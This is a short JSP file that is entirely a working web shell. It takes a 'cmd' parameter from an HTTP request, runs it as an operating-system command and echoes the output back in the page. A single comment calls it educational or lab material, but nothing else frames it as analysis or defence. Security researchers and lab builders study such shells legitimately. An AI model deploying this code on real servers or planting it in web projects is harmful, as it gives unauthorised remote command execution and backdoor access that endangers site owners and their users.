<%@ page import="java.io.*" %>
<%
// JSP Webshell — for educational/lab purposes only
String cmd = request.getParameter("cmd");
if (cmd != null) {
	Process p = Runtime.getRuntime().exec(cmd);
	BufferedReader br = new BufferedReader(
		new InputStreamReader(p.getInputStream()));
	String line;
	out.println("<pre>");
	while ((line = br.readLine()) != null) {
		out.println(line);
	}
	out.println("</pre>");
}
%>
